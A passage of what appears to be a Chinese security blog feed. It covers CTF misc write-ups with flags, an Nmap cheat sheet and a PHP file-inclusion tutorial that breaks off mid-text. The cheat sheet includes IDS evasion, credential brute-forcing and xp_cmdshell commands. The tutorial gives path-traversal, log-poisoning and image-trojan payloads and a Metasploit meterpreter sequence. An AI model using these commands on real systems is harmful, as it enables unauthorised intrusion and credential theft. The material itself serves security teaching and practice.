flag{bilibili_silisili_panama}</p><h3 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h3><p>图片的标题图穷flag见</p><p>以及题目图穷匕见都暗示该图片在文件末尾隐藏了信息，主题会画图吗的作用下文再分析</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805020025_829.png" alt=""></p><p>winhex打开，找到jpg的文件尾FF D9，发现其后还有大量的数据</p><p>复制保存到txt中尝试将数据按16进制-&gt;ASCII方式解码，思路就很明显了，使用的是notepad++中的插件Converter进行解码HEX-&gt;ASCII</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805042005_925.png" alt=""></p><p>这时候再结合会画图吗的提示，将这些坐标做成一张图即可，</p><p>用gnuplot这个工具比较方便，因此将坐标转为gnuplot能识别的格式 坐标1 坐标2</p><p>所以需要替换格式</p><p>替换</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061413_574.png" alt=""></p><p>kali安装gnuplot：sudo apt-get install gnuplot-x11 </p><p>plot “/root/Desktop/111.txt”  </p><p>但windows下是使用 plot “C:\\Users\\Asus\\Desktop\\111.txt”  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061427_357.png" alt=""></p><p>flag{40fc0a979f759c8892f4dc045e28b820}  </p><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><p>通过网址，可以看到一个convert.txt文件，文件内容为二进制</p><p>将所有的二进制串转化为十六进制串</p><p>十六进制串写入到一个rar的压缩包中,解压压缩包我们可以看到一个CTF图片: </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061458_280.png" alt=""></p><p>试一试右键属性发现base64编码的一段文字 解码。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061459_512.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061500_151.png" alt=""></p><p>flag{01a25ea3fd6349c6e635a1d0196e75fb}</p><pre><code class="python">import binascii__author__ = &#39;Mang0&#39;# !/usr/bin/env python# -*- coding: utf-8 -*-base = [str(x) for x in range(10)] + [chr(x) for x in range(ord(&#39;A&#39;), ord(&#39;A&#39;) + 6)]# bin2decdef bin2dec(string_num):    return str(int(string_num, 2))# hex2decdef hex2dec(string_num):    return str(int(string_num.upper(), 16))# dec2bindef dec2bin(string_num):    num = int(string_num)    mid = []    while True:        if num == 0: break        num, rem = divmod(num, 2)        mid.append(base[rem])    return &#39;&#39;.join([str(x) for x in mid[::-1]])# dec2hexdef dec2hex(string_num):    num = int(string_num)    mid = []    while True:        if num == 0:            break        num, rem = divmod(num, 16)        mid.append(base[rem])    return &#39;&#39;.join([str(x) for x in mid[::-1]])# hex2tobindef hex2bin(string_num):    return dec2bin(hex2dec(string_num.upper()))# bin2hexdef bin2hex(string_num):    return dec2hex(bin2dec(string_num))if __name__ == &#39;__main__&#39;:    file1 = open(&#39;convert.txt&#39;)    s = file1.read()    hexx = bin2hex(s)    print (hexx)    file2 = open(&#39;4.rar&#39;, &#39;wb&#39;)    file2.write(binascii.a2b_hex(hexx))</code></pre><h3 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h3><p>通过网址，下载wav的音乐源文件：</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061513_376.png" alt=""></p><p>通过Audacity软件打开音乐源文件，我们可以看到源文件中插入了一串东西：</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061513_11.png" alt=""></p><p>放大观察，我们很容易想到是一串摩斯密码（短横杠代表<code>.</code>，长横杠代表<code>-</code>，中间代表空格）</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061514_267.png" alt=""></p><p>按照规律得到摩斯密码为：</p><pre><code>..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</code></pre><p>解密后的字符串得到flag：<img src="http://oy0tigw51.bkt.clouddn.com/201805061518_97.png" alt=""></p><p>5BC925649CB0188F52E617D70929191C</p><h3 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h3><p> 打开记事本发现是一串0-255的数字，推测是RGB的数字表示形式。每组数据对应一个像素点，图片宽度推测503*122，撸个python脚本</p><pre><code>from PIL import Imageimport rex = 503 #x坐标  通过对txt里的行数进行整数分解y = 122 #y坐标  x*y = 行数im = Image.new(&quot;RGB&quot;,(x,y))#创建图片file = open(&#39;misc100.txt&#39;) #打开rbg值文件#通过一个个rgb点生成图片for i in range(0,x):    for j in range(0,y):        line = file.readline()#获取一行        rgb = line.split(&quot;,&quot;)#分离rgb        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素im.show()</code></pre><p>flag{youc@n’tseeme}</p><h3 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061547_404.jpg" alt=""></p><p>binwalk分析</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061546_905.png" alt=""></p><p>得到一个rar文件</p><p>解码密码不知道 右键图片属性也没有 爆破也没得到</p><p>后来网上查到密码就是“喜欢我吗.”尝试一下，将文本解压出来 </p><blockquote><p>嘟嘟嘟嘟<br>士兵：报告首长！已截获纳粹的加密电报！<br>首长：拿来看看</p><p>电报内容：<br>…./-/-/.–./—…/-..-./-..-././-./-.-./—/-.././.-.-.-/-.-./…./.-/…./..-/—/.-.-.-/-.-./—/–/-..-.</p><p>首长：我操你在逗我吗？你确定是他们纳粹发的吗？<br>士兵：难道我弄错了？哦。。。等等是这一条</p><p>内容：<a href="http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=" target="_blank" rel="external">http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=</a><br>      AES Key：@#@#￥%……￥￥%%……&amp;￥</p><p>士兵：二维码真的扫不出来吗？？肯定可以扫出来</p></blockquote><p>第一个电报密文很明显就是莫斯密码工具解密，得到一个网站：HTTP://ENCODE.CHAHUO.COM/ </p><p>AES加密</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061550_867.png" alt=""></p><p>momoj2j.png </p><p>那么真正网址就是<a href="http://c.bugku.com/momoj2j.png" target="_blank" rel="external">http://c.bugku.com/momoj2j.png</a></p><p>访问后出现一个二维码，直接扫码，什么都扫不出来</p><p>反色得到flag</p><p>KEY{nitmzhen6}  </p><h3 id="很普通的数独-ISCCCTF"><a href="#很普通的数独-ISCCCTF" class="headerlink" title="很普通的数独(ISCCCTF)"></a>很普通的数独(ISCCCTF)</h3><p>下载zip，增加.zip得到25张数独的照片</p><p>确实没想到找了资料</p><p><a href="http://blog.chrstm.com/2017/05/29/ISCC2017/" target="_blank" rel="external">http://blog.chrstm.com/2017/05/29/ISCC2017/</a></p><p><a href="http://isron.cn/2017/05/24/ISCC-shudu/" target="_blank" rel="external">http://isron.cn/2017/05/24/ISCC-shudu/</a></p><p>base64编码的字符串：  Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9  经过7次解码之后就得到flag  <strong>flag：flag{y0ud1any1s1}</strong> </p><h3 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h3><p>发现一共解压出来68个zip压缩包。当我们尝试打开压缩包时，提示我们输入密码 </p><p>crc32碰撞，暴力破解得到base64 ，解码十六进制</p><ul><li>cf907300000d00000000000000aa3e7a008023004900000054000000028634abfe6b631d491d33030001000000434d54091514cbdd414f952448d3e88f984511514146f79f1d20427c6d2bb869ca9f282c3328fc4816991f1b181d8f382c4676e1c5ed674d72de4d4ad58274be92bd1f0a94cdbeaef73f22804af77420902d001d0000001d0000000262d1e7d54f631d491d30080020000000666c61672e74787400b0346966666978207468652066696c6520616e64206765742074686520666c6167c43d7b00400700a</li></ul><p>之后补上文件头后解压</p><p>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://blog.csdn.net/xuqi7/article/details/71436020" target="_blank" rel="external">CTF—图片相关</a></p><p><a href="https://my.oschina.net/ososchina/blog/801358" target="_blank" rel="external">PNG图片文件结构分析</a></p><p><a href="https://www.anquanke.com/post/id/86211" target="_blank" rel="external">CTF比赛中关于zip的总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;bugku-misc&quot;&gt;&lt;a href=&quot;#bugku-misc&quot; class=&quot;headerlink&quot; title=&quot;bugku misc&quot;&gt;&lt;/a&gt;bugku misc&lt;/h1&gt;&lt;p&gt;做了iscc2018发现自己misc能力差很多，也忘了很多，这周做了bugk
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Nmap 使用技巧汇总</title>
    <link href="http://0xmj.club/2018/04/23/Nmap-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%B1%87%E6%80%BB/"/>
    <id>http://0xmj.club/2018/04/23/Nmap-使用技巧汇总/</id>
    <published>2018-04-23T14:07:46.000Z</published>
    <updated>2018-04-23T14:08:28.403Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nmap-使用技巧汇总"><a href="#Nmap-使用技巧汇总" class="headerlink" title="Nmap 使用技巧汇总"></a>Nmap 使用技巧汇总</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><pre><code>1. 全面扫描/综合扫描nmap -A 192.168.1.1032. Ping扫描nmap -sP 192.168.1.1/243. 免Ping扫描，穿透防火墙，避免被防火墙发现nmap -P0 192.168.1.1034. TCP SYN Ping 扫描nmap -PS -v 192.168.1.103nmap -PS80,10-100 -v 192.168.1.103 （针对防火墙丢弃RST包）5. TCP ACK Ping 扫描nmap -PA -v 192.168.1.1036. UDP Ping 扫描nmap -PU -v 192.168.1.1037. ICMP Ping Types 扫描nmap -PU -v 192.168.1.103    (ICMP ECHO)nmap -PP -v 192.168.1.103    (ICMP 时间戳)nmap -PM -v 192.168.1.103    (ICMP 地址掩码)8. ARP Ping 扫描nmap -PR -v 192.168.1.1039. 列表 扫描nmap -sL -v 192.168.1.10310. 禁止方向域名解析nmap -n -sL -v 192.168.1.10311. 方向域名解析nmap -R -sL -v 192.168.1.10312. 使用系统域名解析系统nmap --system-dns 192.168.1.2 192.168.1.10313. 扫描IPV6地址nmap -6 IPv614. 路由跟踪nmap --traceroute -v www.sunbridgegroup.com15. SCTP INIT Ping 扫描nmap -PY -v 192.168.1.103</code></pre><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><pre><code>1. 时序扫描nmap -T(0-5) 192.168.1.1032. 常用扫描方式nmap -p 80 192.168.1.103nmap -p 80-100 192.168.1.103nmap -p T:80,U:445 192.168.1.103nmap -F 192.168.1.1.103    (快速扫描)nmap --top-ports 100 192.168.1.103    (扫描最有用的前100个端口)3. TCP SYN 扫描 （高效的扫描方式）[半开链接扫描]nmap -sS -v 192.168.1.1034. TCP 连接扫描[全连接扫描]nmap -sT -v 192.168.1.1035. UDP 连接扫描nmap -sU -p 80-100 192.168.1.1036. 隐蔽扫描nmap -sN 61.241.194.153(NULL扫描)nmap -sF 61.241.194.153(FIN扫描)nmap -sX 61.241.194.153(Xmas扫描)7. TCP ACK 扫描nmap -sA 192.168.1.1038. TCP 窗口扫描nmap -sW -v -F  192.168.1.1039. TCP Maimon 扫描nmap -sM -T4  192.168.1.10310. 自定义 扫描nmap -sT --scanflags SYNURG 192.168.1.10311. 空闲 扫描( 隐藏IP )nmap -sI www.0day.co:80 192.168.1.10312. IP协议 扫描nmap -sO -T4 192.168.1.10313. FTP Bounce 扫描(已经不被支持)</code></pre><h2 id="三、指纹识别与探测"><a href="#三、指纹识别与探测" class="headerlink" title="三、指纹识别与探测"></a>三、指纹识别与探测</h2><pre><code>1. 版本探测（显示banner信息）nmap -sV 192.168.1.103nmap -sV -A 192.168.1.1032. 全端口版本探测nmap -sV --allports 192.168.1.1033. 设置扫描强度nmap -sV --version-intensity (0-9) 192.168.1.1034. 轻量级扫描nmap -sV --version-light 2 192.168.1.1035. 重量级扫描nmap -sV --version-all 192.168.1.1036. 获取详细版本信息nmap -sV --version-trace 192.168.1.1037. RPC扫描nmap -sS -sR 192.168.1.1038. 对指定的目标进行操作系统监测nmap -O --osscan-limit 192.168.1.1039. 推测系统并识别nmap -O --osscan-guess 192.168.1.103</code></pre><h2 id="四、伺机而动"><a href="#四、伺机而动" class="headerlink" title="四、伺机而动"></a>四、伺机而动</h2><pre><code>1. 调整并行扫描组的大小nmap --min-hostgroup 30 192.168.1.110/24nmap --max-hostgroup 30 902 192.168.1.1042. 调整探测报文的并行度nmap --min-parallelism 100 192.168.1.104nmap --max-parallelism 100 192.168.1.1043. 调整探测报文超时nmap --initial-rtt-timeout 100ms 192.168.1.104nmap --max-rtt-timeout 100ms 192.168.1.104nmap --min-rtt-timeout 100ms 192.168.1.1044. 放弃缓慢的目标主机nmap --host-timeout 1800000ms 192.168.1.1045. 调整报文适合时间间隔nmap --scan-delay 1s 192.168.1.104nmap --max-scan-delay 1s 192.168.1.104</code></pre><h2 id="五、防火墙-IDS逃逸"><a href="#五、防火墙-IDS逃逸" class="headerlink" title="五、防火墙/IDS逃逸"></a>五、防火墙/IDS逃逸</h2><pre><code>1. 报文分段nmap -f -v 61.241.194.1532. 指定偏移大小nmap --mtu 16 192.168.1.1043. IP欺骗nmap -D RND:11 192.168.1.104nmap -D 192.168.1.104,192.168.1.103,192.168.1.101 192.168.1.1044. 源地址欺骗nmap -sI www.0day.cn:80 192.168.1.1045. 源端口欺骗nmap --source-port 902 192.168.1.1046. 指定发包长度nmap --data-length 30 192.168.1.1047. 目标主机随机排序nmap --randomize-hosts 192.168.1.1048. MAX地址欺骗nmap -sT -Pn --spoof-mac 0 192.168.1.104</code></pre><h2 id="六、信息收集"><a href="#六、信息收集" class="headerlink" title="六、信息收集"></a>六、信息收集</h2><pre><code>1. IP信息收集nmap --script ip-geolocation-* www.pcos.cn2. WHOIS 查询nmap --script whois-domain www.pcos.cnnmap --script whois-domain --script-args whois.whodb=nofollow www.ithome.comnmap -sn --script whois-domain -v -iL host.txt3. 搜索邮件信息(新版可能没有这个模块)nmap --script http-email-harvest www.pcos.cn4. IP反查nmap -sn --script hostmap-ip2hosts www.pcos.cn5. DNS信息收集nmap --script dns-brute www.pcos.cnnmap --script dns-brute dns-brute.threads=10 www.pcos.cnnmap --script dns-brute dns-brute.threads=10,dns-brute.hostlis www.pcos.cn6. 检索系统信息nmap -p 445 445 192.168.1.104 --script membase-http-info7. 后台打印机服务漏洞nmap --script smb-security-mode.nse -p 445 119.29.155.458. 系统漏洞扫描nmap --script smb-check-vulns.nse -p 445 119.29.155.459.扫描Web漏洞nmap -p80 --script http-stored-xss.nse/http-sql-injection.nse 119.29.155.4510. 通过 Snmp 列举 Windows 服务/账户nmap -sU -p 161 --script=snmp-win32-services 192.168.1.104nmap -sU -f -p 161 --script=snmp-win32-users 192.168.1.11011. 枚举 DNS 服务器的主机名nmap --script dns-brute --script-args dns-brute.domain=baidu.com12. HTTP信息收集nmap -sV -p 80 www.0day.com (HTTP版本探测)nmap -p 80 --script=http-headers www.pcos.cn (HTTP信息头探测)nmap -p 80 --script=http-sitemap-generator www.pcos.cn (爬行Web目录结构)13. 枚举SSL密钥nmap -p 443 --script=ssl-enum-ciphers www.baidu.com14. SSH服务密钥信息探测map -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 127.0.0.1</code></pre><h2 id="七、数据库渗透测试"><a href="#七、数据库渗透测试" class="headerlink" title="七、数据库渗透测试"></a>七、数据库渗透测试</h2><pre><code>1. Mysql列举数据库nmap -p3306 --script=mysql-databases --script-args mysqluser=root,mysqlpass 192.168.1.1012. 列举 MySQL 变量nmap -p3306 --script=mysql-variables 192.168.1.3nmap -sV --script=mysql-variables 192.168.1.3 (无法确定端口的情况下)3. 检查 MySQL 密码nmap -p3306 --script=mysql-empty-password 192.168.1.3nmap -sV -F -T4 --script=mysql-empty-password 192.168.1.34. 审计 MySQL 密码nmap --script=mysql-brute 192.168.1.101nmap -p3306 --script=mysql-brute userdb=/root/passdb.txt passdb=/root/pass.txt 192.168.1.101 (指定字典)5. 审计 MySQL 安全配置nmap -p3306 --script mysql-audit --script-args &quot;mysql-audit.username=&#39;root&#39;,mysql-audit.password=&#39;123&#39;,mysql-audit.filename=&#39;nselib/data/mysql-cis.audit&#39;&quot; 192.168.1.1046. 审计 Oracle 密码nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test 192.168.1.121nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=/tmp/usernames.txt,passdb=/tmp/password.txt 192.168.1.1057. 审计 msSQL密码nmap -p 1433 --script ms-sql-brute --script-args userdb=name.txt,passdb=pass.txt 192.168.1.1048. 检查 msSQL空密码nmap -p 1433 --script ms-sql-empty-password 192.168.1.1049. 读取 msSQL 数据nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.Password=sa 192.168.1.10110. 读取 msSQL 执行系统命令nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=&quot;ipconfig&quot; 192.168.1.10111. 审计 PgSQL 密码nmap -p 5432 --script pgsql-brute 192.168.1.101</code></pre><h2 id="八、渗透测试"><a href="#八、渗透测试" class="headerlink" title="八、渗透测试"></a>八、渗透测试</h2><pre><code>1. 审计 HTTP 身份验证nmap --script=http-brute -p 80 www.pcos.cn2. 审计 FTP 服务器nmap --script ftp-brute -p 21 192.168.1.101nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 192.168.1.101nmap --script=ftp-anon 192.168.1.1013. 审计 Wordpress 程序nmap -p80 --script http-wordpress-brute 192.168.1.110nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.110nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.threads=10 192.168.1.1104. 审计 Joomla 程序nmap -p80 --script http-joomla-brute 192.168.1.110nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt 192.168.1.110nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt,http-joomla-brute.threads=5 192.168.1.1105. 审计 邮件服务器 nmap -p110 --script=pop3-brute 192.168.1.1106. 审计 SMB 口令nmap --script smb-brute.nse -p 445 192.168.1.110nmap --script smb-brute.nse --script-args passdb=pass.txt -p 445 192.168.1.1107. 审计 VNC 服务nmap --script vnc-brute -p 5900 192.168.1.1108. 审计 SMTP 服务器nmap -p 25 --script smtp-brute 192.168.1.110nmap -p 25 --script=smtp-enum-users.nse smith.jack.com (枚举远程系统所有用户)9. 检测 Stuxnet 蠕虫nmap --script stuxnet-detect -p 445 192.168.1.11010. SNMP 服务安全审计nmap -sU -p 161 --script=snmp-netstat 192.168.1.101 (获取目标主机网络连接状态)nmap -sU -p 161 --script=snmp-processes 192.168.1.110 (枚举目标主机的系统进程)nmap -sU -p 161 --script=snmp-win32-services 192.168.1.110 (获得windows服务器的服务)nmap -sU -p 161 --script snmp-brute 192.168.1.110</code></pre><h2 id="九、Zenmap"><a href="#九、Zenmap" class="headerlink" title="九、Zenmap"></a>九、Zenmap</h2><pre><code>1. Intense scan (详细扫描)nmap -T4 -A -v 192.168.1.1012. Intense scan plus UDP (UDP扫描经典使用)nmap -sS -sU -T4 -A -v 192.168.1.1013. Intense scan, all TCP ports (TCP扫描)nmap -p 1-65535 -T4 -A -v 192.168.1.1014. Intense scan, no ping (无Ping扫描)nmap -T4 -A -v -Pn 192.168.1.1015. Ping scan (Ping扫描)nmap -sn 192.168.1.101/246. Quick scannmap -T4 -F 192.168.1.101/247. Quick scan plusnmap -sV -T4 -O -F --version-light 192.168.1.101/248. Quick traceroutenmap -sn --traceroute 192.168.1.1019. Regular scan nmap 192.168.1.10110. Slow comprehensive scannmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; 192.168.1.101</code></pre><h2 id="十-Nmap-技巧"><a href="#十-Nmap-技巧" class="headerlink" title="十. Nmap 技巧"></a>十. Nmap 技巧</h2><pre><code>1. 发送以太网数据包nmap --send-eth 192.168.1.1112. 网络层发送nmap --send-ip 192.168.1.1113. 假定拥有所有权nmap --privileged 192.168.1.1114. 在交互模式中启动nmap --interactive5. 查看 Nmap 版本号nmap -V6. 设置调试级别nmap -d (1-9) 192.168.1.1117. 跟踪发送接收的报文nmap --packet-trace -p 20-30 192.168.1.1118. 列举接口和路由nmap --iflist www.iteye.com9. 指定网络接口nmap -e eth0 192.168.1.11110. 继续中断扫描nmap -oG 1.txt -v 192.168.126.1/24nmap --resume 1.txt (继续扫描)11. Dnmapdnmap_server -f test (指定命令脚本)dnmap_client -s 192.168.1.107 -a test12. 编写 Nse 脚本    (1)    -- The scanning module --        author = &quot;Wing&quot;        categories = {&quot;version&quot;}        portrule = function(host,port)            return port.protocol == &quot;tcp&quot; and port.number == 80 and port.state == &quot;open&quot;        end        action = function(host,port)            return &quot;Found!!!&quot;        end    (2) -- The scanning module --        author = &quot;Wing&quot;        categories = {&quot;version&quot;}        local comm=require &quot;comm&quot;        require &quot;shortport&quot;        local http=require &quot;http&quot;        portrule = function(host,port)            return (port.number == 80) and (port.start==&quot;open&quot;)        end        action = function(host,port)            local uri = &quot;/admin.php&quot;            local response = http.get(host,port,uri)            return &quot;Found!!!&quot;        end13. 探测防火墙nmap --script=firewalk --traceroute 192.168.1.11114. VMware认证破解nmap -p 902 --script vmauthd-brute 192.168.1.107</code></pre><h2 id="十一-Nmap的保存和输出"><a href="#十一-Nmap的保存和输出" class="headerlink" title="十一. Nmap的保存和输出"></a>十一. Nmap的保存和输出</h2><pre><code>1. 标准保存nmap -F -oN d:/test1.txt 192.168.1.1112. XML保存nmap -F -oX d:/test1.xml 192.168.1.1113. 133t 保存nmap -F -oS d:/test2.txt 192.168.1.1114. Grep 保存nmap -F -oG d:/test2.txt 192.168.1.1115. 保存到所有格式nmap -F -oA d:/test2 192.168.1.1116. 补充保存文件nmap -F -append-output -oN d:/test2.txt 192.168.1.1117. 转换 XML 保存nmap -F -oX testB.xml --stylesheet http://www.insecure.org/nmap/data/nmap.xsl 192.168.1.1118. 忽略 XML 声明的 XSL 样式表nmap -oX d:/testC.xml --no-stylesheet 192.168.1.111</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nmap-使用技巧汇总&quot;&gt;&lt;a href=&quot;#Nmap-使用技巧汇总&quot; class=&quot;headerlink&quot; title=&quot;Nmap 使用技巧汇总&quot;&gt;&lt;/a&gt;Nmap 使用技巧汇总&lt;/h1&gt;&lt;h2 id=&quot;一、主机发现&quot;&gt;&lt;a href=&quot;#一、主机发现&quot; cla
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Nmap" scheme="http://0xmj.club/tags/Nmap/"/>
    
  </entry>
  
  <entry>
    <title>php文件包含漏洞</title>
    <link href="http://0xmj.club/2018/04/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://0xmj.club/2018/04/23/php文件包含漏洞/</id>
    <published>2018-04-23T13:39:49.000Z</published>
    <updated>2018-05-15T11:05:46.442Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php文件包含漏洞"><a href="#php文件包含漏洞" class="headerlink" title="php文件包含漏洞"></a>php文件包含漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><p>php中引发文件包含漏洞的通常是以下四个函数：</p><ol><li><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="external">include()</a>   当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</li><li><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="external">include_once()</a>   功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。</li><li><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="external">require()</a>  只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li><li><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="external">require_once()</a> 它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</li></ol><p>当使用这四个函数包含一个新文件时，该文件将作为PHP代码执行，php内核并不在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片文件、远程url、也都将作为PHP代码执行。这一特性，在实施攻击时非常有用。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>(1)include等函数通过动态执行变量的方式引入需要包含的文件；</p><p>(2)用户能控制该动态变量。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启 了我们就有可能包含远程文件。</p><p>1、本地文件包含LFI(Local File Include)</p><p> 2、远程文件包含RFI(Remote File Include)（需要php.ini中allow_url_include=on  allow_url_fopen = On）</p><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p><h2 id="一、本地包含"><a href="#一、本地包含" class="headerlink" title="一、本地包含"></a>一、本地包含</h2><h3 id="包含同目录下的文件"><a href="#包含同目录下的文件" class="headerlink" title="包含同目录下的文件"></a>包含同目录下的文件</h3><p>?file=test.txt</p><h3 id="目录遍历："><a href="#目录遍历：" class="headerlink" title="目录遍历："></a>目录遍历：</h3><p>?file=./../../test.txt<br>./当前目录,../上一级目录,这样的遍历目录来读取文件</p><h3 id="包含图片木马"><a href="#包含图片木马" class="headerlink" title="包含图片木马"></a>包含图片木马</h3><p>命令行下执行：<code>copy x.jpg /b + s.php /b f.jpg</code></p><p>上传 f.jpg</p><p>找到 f.jpg 路径</p><p>包含 f.jpg</p><h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p><p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p><p> ?file=../../../../../../../../../var/log/apache/error.log </p><p>1.</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804032017_676.png" alt=""></p><p>​   </p><p>2.可以尝试利用UA插入payload到日志文件</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804032021_793.png" alt=""></p><p>3.MSF攻击模块</p><pre><code>use exploit/unix/webapp/php_includeset rhost 192.168.159.128set rport 80set phpuri /index.php?file=xxLFIxxset path http://172.18.176.147/set payload php/meterpreter/bind_tcpset srvport 8888exploit -z</code></pre><p><strong>日志默认路径</strong></p><p>(1) apache+Linux日志默认路径</p><pre><code>/etc/httpd/logs/access_log</code></pre><p>或者</p><pre><code>/var/log/httpd/access log</code></pre><p> (2) apache+win2003日志默认路径</p><pre><code>D:xamppapachelogsaccess.logD:xamppapachelogserror.log</code></pre><p>(3) IIS6.0+win2003默认日志文件</p><pre><code>C:WINDOWSsystem32Logfiles</code></pre><p>(4) IIS7.0+win2003 默认日志文件</p><pre><code>%SystemDrive%inetpublogsLogFiles</code></pre><p>(5) nginx 日志文件在用户安装目录的logs目录下</p><p>如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里</p><p>也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log）</p><p><strong>2）web中间件默认配置</strong></p><p> (1) apache+linux 默认配置文件</p><pre><code>/etc/httpd/conf/httpd.conf</code></pre><p>或者</p><pre><code>index.php?page=/etc/init.d/httpd</code></pre><p>(2) IIS6.0+win2003 配置文件</p><p>C:/Windows/system32/inetsrv/metabase.xml </p><p>(3) IIS7.0+WIN 配置文件</p><p>C:WindowsSystem32inetsrvconfigapplicationHost.config</p><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>利用条件：session文件路径已知，且其中内容部分可控。</p><p>PHP默认生成的Session文件往往存放在/tmp目录下<br>/tmp/sess_SESSIONID</p><p>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</p><p>（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）</p><h3 id="包含-proc-self-environ文件"><a href="#包含-proc-self-environ文件" class="headerlink" 